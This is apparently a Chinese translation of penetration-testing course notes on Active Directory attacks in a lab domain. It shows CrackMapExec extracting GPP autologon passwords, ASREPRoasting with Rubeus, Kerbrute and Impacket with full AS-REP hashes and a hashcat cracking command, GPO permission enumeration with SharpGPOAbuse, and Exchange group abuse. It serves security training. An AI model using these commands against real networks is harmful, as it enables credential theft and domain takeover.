<h3 id="CrackMapExec’s-gpp-autologin-Module"><a href="#CrackMapExec’s-gpp-autologin-Module" class="headerlink" title="CrackMapExec’s gpp_autologin Module"></a>CrackMapExec’s gpp_autologin Module</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 </span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/&#123;CAEBB51E-92FD-431D-8DBE-F9312DB5617D&#125;/Machine/Preferences/Registry/Registry.xml</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/&#123;CAEBB51E-92FD-431D-8DBE-F9312DB5617D&#125;/Machine/Preferences/Registry/Registry.xml</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: [&#x27;guarddesk&#x27;]</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: [&#x27;INLANEFREIGHT.LOCAL&#x27;]</span><br><span class="line">GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: [&#x27;ILFreightguardadmin!&#x27;]</span><br></pre></td></tr></table></figure>

<p>在上面的输出中，可以看到已检索到名为 的帐户的凭据<code>guarddesk</code>。这可能是为了让警卫使用的共享工作站在启动时自动登录，以适应白天和晚上轮班工作的多个用户。在这种情况下，凭据可能是本地管理员，因此值得找到可以以管理员身份登录并寻找其他数据的主机。有时可能会发现高权限用户的凭据或对无用的已禁用帐户&#x2F;过期密码的凭据。</p>
<p>在本模块中涉及的一个主题是密码重用。许多组织中密码卫生不良的情况很常见，因此每当获得凭据时，都应该检查是否可以使用它们访问其他主机（作为域或本地用户）、利用任何权限（例如有趣的 ACL）、访问共享，或者在密码喷洒攻击中使用密码来发现密码重用，或许是授予进一步访问权限以实现目标的帐户。</p>
<h2 id="ASREPRoasting"><a href="#ASREPRoasting" class="headerlink" title="ASREPRoasting"></a>ASREPRoasting</h2><p><a target="_blank" rel="noopener" href="https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory">任何启用了“不需要 Kerberos 预身份验证”</a>设置的帐户都可以获取票证授予票证 (TGT) 。许多供应商安装指南都指定以这种方式配置其服务帐户。身份验证服务回复 (AS_REP) 使用帐户的密码加密，任何域用户都可以请求它。</p>
<p>使用预身份验证时，用户输入密码，该密码会加密时间戳。域控制器将解密该时间戳以验证是否使用了正确的密码。如果成功，将向用户发出 TGT 以在域中发出进一步的身份验证请求。如果帐户已禁用预身份验证，攻击者可以请求受影响帐户的身份验证数据并从域控制器检索加密的 TGT。这可以使用 Hashcat 或 John the Ripper 等工具进行离线密码攻击。</p>
<p>查看“不需要 Kerberos 预身份验证”选项查看帐户</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729068577400.png" alt="图像"></p>
<p>ASREPRoasting 与 Kerberoasting 类似，但它涉及攻击 AS-REP 而不是 TGS-REP。不需要 SPN。可以使用 PowerView 或内置工具（例如 PowerShell AD 模块）枚举此设置。</p>
<p>攻击本身可以使用<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a>工具包和其他工具来执行，以获取目标帐户的票证。如果攻击者拥有<code>GenericWrite</code>或<code>GenericAll</code>对帐户拥有权限，他们可以启用此属性并获取 AS-REP 票证以进行离线破解，以恢复帐户的密码，然后再禁用该属性。与 Kerberoasting 一样，此攻击的成功取决于帐户是否具有相对较弱的密码。</p>
<h3 id="PowerView-Get-DomainUser"><a href="#PowerView-Get-DomainUser" class="headerlink" title="PowerView Get-DomainUser"></a>PowerView Get-DomainUser</h3><p>PowerView 可用于枚举 UAC 值设置为 的用户<code>DONT_REQ_PREAUTH</code>。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainUser</span> <span class="literal">-PreauthNotRequired</span> | <span class="built_in">select</span> samaccountname,userprincipalname,useraccountcontrol | <span class="built_in">fl</span></span><br><span class="line"></span><br><span class="line">samaccountname     : mmorgan</span><br><span class="line">userprincipalname  : mmorgan@inlanefreight.local</span><br><span class="line">useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH</span><br></pre></td></tr></table></figure>

<p>掌握这些信息后，可以利用 Rubeus 工具以正确的格式检索 AS-REP，以进行离线哈希破解。此攻击不需要任何域用户上下文，只需知道用户的 SAM 名称即可完成，无需 Kerberos 预授权。将在本节后面看到一个使用 Kerbrute 的示例。请记住，添加标志<code>/nowrap</code>，以便票证不是列包装的，并以可以轻松输入 Hashcat 的格式检索。</p>
<h3 id="Retrieve-AS-REP"><a href="#Retrieve-AS-REP" class="headerlink" title="Retrieve AS-REP"></a>Retrieve AS-REP</h3><h4 id="Rubeus-2"><a href="#Rubeus-2" class="headerlink" title="Rubeus"></a>Rubeus</h4><p>Rubeus 以正确的格式检索 AS-REP</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line">[*] Action: AS<span class="literal">-REP</span> roasting</span><br><span class="line"></span><br><span class="line">[*] Target User            : mmorgan</span><br><span class="line">[*] Target Domain          : INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">[*] Searching path <span class="string">&#x27;LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL&#x27;</span> <span class="keyword">for</span> <span class="string">&#x27;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))&#x27;</span></span><br><span class="line">[*] SamAccountName         : mmorgan</span><br><span class="line">[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ<span class="literal">-NYC</span>,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/o preauth) <span class="keyword">for</span>: <span class="string">&#x27;INLANEFREIGHT.LOCAL\mmorgan&#x27;</span></span><br><span class="line">[+] AS<span class="literal">-REQ</span> w/o preauth successful!</span><br><span class="line">[*] AS<span class="literal">-REP</span> hash:</span><br><span class="line">     <span class="variable">$krb5asrep</span><span class="variable">$23</span><span class="variable">$mmorgan</span>@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55<span class="variable">$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA</span></span><br></pre></td></tr></table></figure>

<p>然后，可以使用模式的 Hashcat 离线破解哈希<code>18200</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure>

<h4 id="Kerbrute-2"><a href="#Kerbrute-2" class="headerlink" title="Kerbrute"></a>Kerbrute</h4><p>当使用<code>Kerbrute</code>执行用户枚举时，该工具将自动检索任何不需要 Kerberos 预身份验证的用户的 AS-REP。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt </span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/04/01 13:14:17 &gt;  Using KDC(s):</span><br><span class="line">2022/04/01 13:14:17 &gt;  	172.16.5.5:88</span><br><span class="line"></span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 sbrown@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 jjones@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 tjohnson@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 jwilson@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 bdavis@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 njohnson@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 asanchez@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 dlewis@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] VALID USERNAME:	 ccruz@inlanefreight.local</span><br><span class="line">2022/04/01 13:14:17 &gt;  [+] mmorgan has no pre auth required. Dumping hash to crack offline:</span><br><span class="line">$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad39ec68a33$8698ee566cde591a7ddd1782db6f7ed8531e266befed4856b9fcbbdda83a0c9c5ae4217b9a43d322ef35a6a22ab4cbc86e55a1fa122a9f5cb22596084d6198454f1df2662cb00f513d8dc3b8e462b51e8431435b92c87d200da7065157a6b24ec5bc0090e7cf778ae036c6781cc7b94492e031a9c076067afc434aa98e831e6b3bff26f52498279a833b04170b7a4e7583a71299965c48a918e5d72b5c4e9b2ccb9cf7d793ef322047127f01fd32bf6e3bb5053ce9a4bf82c53716b1cee8f2855ed69c3b92098b255cc1c5cad5cd1a09303d83e60e3a03abee0a1bb5152192f3134de1c0b73246b00f8ef06c792626fd2be6ca7af52ac4453e6a</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>有了有效用户列表，可以使用Impacket 工具包中的<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">Get-NPUsers.py</a>来搜索所有不需要 Kerberos 预认证的用户。该工具将检索 Hashcat 格式的 AS-REP，以便对找到的任何用户进行离线破解。还可以向<code>jsmith.txt</code>工具中输入一个单词列表，它会为不存在的用户抛出错误，但如果它发现任何没有 Kerberos 预认证的有效用户，那么这可能是获得立足点或进一步访问的好方法，具体取决于在评估过程中所处的位置。即使无法使用 Hashcat 破解 AS-REP，仍然应该将此作为发现报告给客户（如果无法破解密码，风险会降低），以便他们可以评估帐户是否需要此设置。</p>
<h4 id="Impacket-GetNPUsers-py"><a href="#Impacket-GetNPUsers-py" class="headerlink" title="Impacket GetNPUsers.py"></a>Impacket GetNPUsers.py</h4><p>搜寻无需使用 Kerberoast 预授权的用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users </span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User sbrown@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User jjones@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User tjohnson@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User jwilson@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User bdavis@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User njohnson@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User asanchez@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User dlewis@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User ccruz@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77ad016e657337630c70f651451400329545fb634c9d329ed024ef145bdc2afd4af498b2f0092766effe6ae12b3c3beac28e6ded0b542e85d3fe52467945d98a722cb52e2b37325a53829ecf127d10ee98f8a583d7912e6ae3c702b946b65153bac16c97b7f8f2d4c2811b7feba92d8bd99cdeacc8114289573ef225f7c2913647db68aafc43a1c98aa032c123b2c9db06d49229c9de94b4b476733a5f3dc5cc1bd7a9a34c18948edf8c9c124c52a36b71d2b1ed40e081abbfee564da3a0ebc734781fdae75d3882f3d1d68afdb2ccb135028d70d1aa3c0883165b3321e7a1c5c8d7c215f12da8bba9</span><br><span class="line">[-] User rramirez@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User jwallace@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User jsantiago@inlanefreight.local doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<p>已经介绍了几种从 Windows 和 Linux 主机执行 ASREPRoasting 攻击的方法，并见证了如何不需要在加入域的主机上来 a) 枚举不需要 Kerberos 预身份验证的帐户，以及 b) 执行此攻击并获取 AS-REP 进行离线破解，以在域中获得立足点或进一步获取访问权限。</p>
<h2 id="Group-Policy-Object-GPO-Abuse"><a href="#Group-Policy-Object-GPO-Abuse" class="headerlink" title="Group Policy Object (GPO) Abuse"></a>Group Policy Object (GPO) Abuse</h2><p>组策略为管理员提供了许多高级设置，这些设置可应用于 AD 环境中的用户和计算机对象。如果使用得当，组策略是一种通过配置用户设置、操作系统和应用程序来强化 AD 环境的绝佳工具。话虽如此，组策略也可能被攻击者滥用。如果可以通过 ACL 错误配置获得对组策略对象的权限，可以利用这一点进行横向移动、特权升级，甚至域入侵，并将其作为域内的持久性机制。了解如何枚举和攻击 GPO 可以为提供帮助，有时甚至可以成为在相当封闭的环境中实现目标的关键。</p>
<p>GPO 错误配置可能被滥用来执行以下攻击：</p>
<ul>
<li>为用户添加额外权限（例如 SeDebugPrivilege、SeTakeOwnershipPrivilege 或 SeImpersonatePrivilege）</li>
<li>将本地管理员用户添加到一个或多个主机</li>
<li>创建立即计划任务来执行任意数量的操作</li>
</ul>
<p>可以使用本模块中使用的许多工具（例如 PowerView 和 BloodHound）枚举 GPO 信息。还可以使用<a target="_blank" rel="noopener" href="https://github.com/Group3r/Group3r">group3r</a>、<a target="_blank" rel="noopener" href="https://github.com/sense-of-security/ADRecon">ADRecon</a>、<a target="_blank" rel="noopener" href="https://www.pingcastle.com/">PingCastle</a>等来审核域中 GPO 的安全性。</p>
<p>使用PowerView 中的<a target="_blank" rel="noopener" href="https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO">Get-DomainGPO</a>功能，可以按名称获取 GPO 列表。</p>
<h3 id="Enumerating-GPO-Names-PowerView"><a href="#Enumerating-GPO-Names-PowerView" class="headerlink" title="Enumerating GPO Names - PowerView"></a>Enumerating GPO Names - PowerView</h3><p>PowerView 枚举 GPO 名称</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainGPO</span> |<span class="built_in">select</span> displayname</span><br><span class="line"></span><br><span class="line">displayname</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">Default Domain Policy</span><br><span class="line">Default Domain Controllers Policy</span><br><span class="line">Deny Control Panel Access</span><br><span class="line">Disallow LM Hash</span><br><span class="line">Deny CMD Access</span><br><span class="line">Disable Forced Restarts</span><br><span class="line">Block Removable Media</span><br><span class="line">Disable Guest Account</span><br><span class="line">Service Accounts Password Policy</span><br><span class="line">Logon Banner</span><br><span class="line">Disconnect Idle RDP</span><br><span class="line">Disable NetBIOS</span><br><span class="line">AutoLogon</span><br><span class="line">GuardAutoLogon</span><br><span class="line">Certificate Services</span><br></pre></td></tr></table></figure>

<p>这可以帮助开始了解已实施的安全措施类型（例如拒绝 cmd.exe 访问和为服务帐户设置单独的密码策略）。可以看到正在使用自动登录，这可能意味着 GPO 中有一个可读的密码，并且可以看到域中存在 Active Directory 证书服务 (AD CS)。如果使用的主机上安装了组策略管理工具，可以使用各种内置的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps">GroupPolicy cmdlet</a>来<code>Get-GPO</code>执行相同的枚举。</p>
<h3 id="Enumerating-GPO-Names-Built-In-Cmdlet"><a href="#Enumerating-GPO-Names-Built-In-Cmdlet" class="headerlink" title="Enumerating GPO Names - Built-In Cmdlet"></a>Enumerating GPO Names - Built-In Cmdlet</h3><p>使用内置 Cmdlet 枚举 GPO 名称</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-GPO</span> <span class="literal">-All</span> | <span class="built_in">Select</span> DisplayName</span><br><span class="line"></span><br><span class="line">DisplayName</span><br><span class="line"><span class="literal">-----------</span></span><br><span class="line">Certificate Services</span><br><span class="line">Default Domain Policy</span><br><span class="line">Disable NetBIOS</span><br><span class="line">Disable Guest Account</span><br><span class="line">AutoLogon</span><br><span class="line">Default Domain Controllers Policy</span><br><span class="line">Disconnect Idle RDP</span><br><span class="line">Disallow LM Hash</span><br><span class="line">Deny CMD Access</span><br><span class="line">Block Removable Media</span><br><span class="line">GuardAutoLogon</span><br><span class="line">Service Accounts Password Policy</span><br><span class="line">Logon Banner</span><br><span class="line">Disable Forced Restarts</span><br><span class="line">Deny Control Panel Access</span><br></pre></td></tr></table></figure>

<p>接下来，可以检查可以控制的用户是否对 GPO 拥有任何权限。特定用户或组可能被授予管理一个或多个 GPO 的权限。首先要检查的是整个域用户组是否对一个或多个 GPO 拥有任何权限。</p>
<h3 id="Enumerating-Domain-User-GPO-Rights"><a href="#Enumerating-Domain-User-GPO-Rights" class="headerlink" title="Enumerating Domain User GPO Rights"></a>Enumerating Domain User GPO Rights</h3><p>枚举域用户 GPO 权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$sid</span>=<span class="built_in">Convert-NameToSid</span> <span class="string">&quot;Domain Users&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainGPO</span> | <span class="built_in">Get-ObjectAcl</span> | ?&#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$sid</span>&#125;</span><br><span class="line"></span><br><span class="line">ObjectDN              : CN=&#123;<span class="number">7</span>CA9C789<span class="literal">-14CE-46E3-A722-83F4097AF532</span>&#125;,CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ObjectSID             :</span><br><span class="line">ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,</span><br><span class="line">                        WriteOwner</span><br><span class="line">BinaryLength          : <span class="number">36</span></span><br><span class="line">AceQualifier          : AccessAllowed</span><br><span class="line">IsCallback            : False</span><br><span class="line">OpaqueLength          : <span class="number">0</span></span><br><span class="line">AccessMask            : <span class="number">983095</span></span><br><span class="line">SecurityIdentifier    : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-513</span></span><br><span class="line">AceType               : AccessAllowed</span><br><span class="line">AceFlags              : ObjectInherit, ContainerInherit</span><br><span class="line">IsInherited           : False</span><br><span class="line">InheritanceFlags      : ContainerInherit, ObjectInherit</span><br><span class="line">PropagationFlags      : None</span><br><span class="line">AuditFlags            : None</span><br></pre></td></tr></table></figure>

<p>在这里可以看到，域用户组对 GPO 具有各种权限，例如<code>WriteProperty</code>和<code>WriteDacl</code>，可以利用这些权限完全控制 GPO，并发起任意数量的攻击，这些攻击将被推送到应用 GPO 的 OU 中的任何用户和计算机。可以使用 GPO GUID 结合<code>Get-GPO</code>来查看 GPO 的显示名称。</p>
<h3 id="Converting-GPO-GUID-to-Name"><a href="#Converting-GPO-GUID-to-Name" class="headerlink" title="Converting GPO GUID to Name"></a>Converting GPO GUID to Name</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ <span class="built_in">Get-GPO</span> <span class="literal">-Guid</span> <span class="number">7</span>CA9C789<span class="literal">-14CE-46E3-A722-83F4097AF532</span></span><br><span class="line"></span><br><span class="line">DisplayName      : Disconnect Idle RDP</span><br><span class="line">DomainName       : INLANEFREIGHT.LOCAL</span><br><span class="line">Owner            : INLANEFREIGHT\Domain Admins</span><br><span class="line">Id               : <span class="number">7</span>ca9c789<span class="literal">-14ce-46e3-a722-83f4097af532</span></span><br><span class="line">GpoStatus        : AllSettingsEnabled</span><br><span class="line">Description      :</span><br><span class="line">CreationTime     : <span class="number">10</span>/<span class="number">28</span>/<span class="number">2021</span> <span class="number">3</span>:<span class="number">34</span>:<span class="number">07</span> PM</span><br><span class="line">ModificationTime : <span class="number">4</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">6</span>:<span class="number">54</span>:<span class="number">25</span> PM</span><br><span class="line">UserVersion      : AD Version: <span class="number">0</span>, SysVol Version: <span class="number">0</span></span><br><span class="line">ComputerVersion  : AD Version: <span class="number">0</span>, SysVol Version: <span class="number">0</span></span><br><span class="line">WmiFilter        :</span><br></pre></td></tr></table></figure>

<p>检查 BloodHound，可以看到该<code>Domain Users</code>组织对<code>Disconnect Idle RDP</code> GPO 拥有多项权限，可以利用这些权限完全控制该对象。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729062756662.png" alt="图像"></p>
<p>如果在 BloodHound 中选择 GPO 并向下滚动到<code>Affected Objects</code>选项<code>Node Info</code>卡，可以看到该 GPO 应用于一个 OU，其中包含四个计算机对象。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729062757039.png" alt="图像"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/SharpGPOAbuse">可以使用SharpGPOAbuse</a>之类的工具来利用此 GPO 错误配置，方法是执行一些操作，例如将控制的用户添加到受影响主机之一的本地管理员组、在其中一台主机上创建即时计划任务以向提供反向 shell，或者配置恶意计算机启动脚本以向提供反向 shell 或类似操作。使用此类工具时，需要小心，因为可以运行影响 GPO 链接到的 OU 内每台计算机的命令。如果发现一个可编辑的 GPO 适用于具有 1,000 台计算机的 OU，不想犯将自己添加为这么多主机的本地管理员的错误。此工具提供的一些攻击选项允许指定目标用户或主机。上图所示的主机不可利用，GPO 攻击将在后面的模块中深入介绍。</p>
<p>在 AD 环境中默认安装 Microsoft Exchange（没有拆分管理模型）会打开许多攻击途径，因为 Exchange 通常会在域内被授予相当大的权限（通过用户、组和 ACL）。该组<code>Exchange Windows Permissions</code>未列为受保护组，但成员被授予将 DACL 写入域对象的权限。可以利用这一点为用户提供 DCSync 权限。攻击者可以利用 DACL 配置错误（可能）或利用属于 Account Operators 组的受感染帐户将帐户添加到此组。通常会发现用户帐户甚至计算机是此组的成员。远程办公室的高级用户和支持人员e通常会被添加到此组，从而允许他们重置密码。此<a target="_blank" rel="noopener" href="https://github.com/gdedrouas/Exchange-AD-Privesc">GitHub 存储库</a>详细介绍了利用 Exchange 在 AD 环境中提升权限的几种技术。</p>
<p>Exchange 组<code>Organization Management</code>是另一个非常强大的组（实际上是 Exchange 的“域管理员”），可以访问所有域用户的邮箱。系统管理员成为此组的成员并不罕见。此组还对名为<code>Microsoft Exchange Security Groups</code>的 OU 具有完全控制权，其中包含组<code>Exchange Windows Permissions</code>。</p>
<hr>
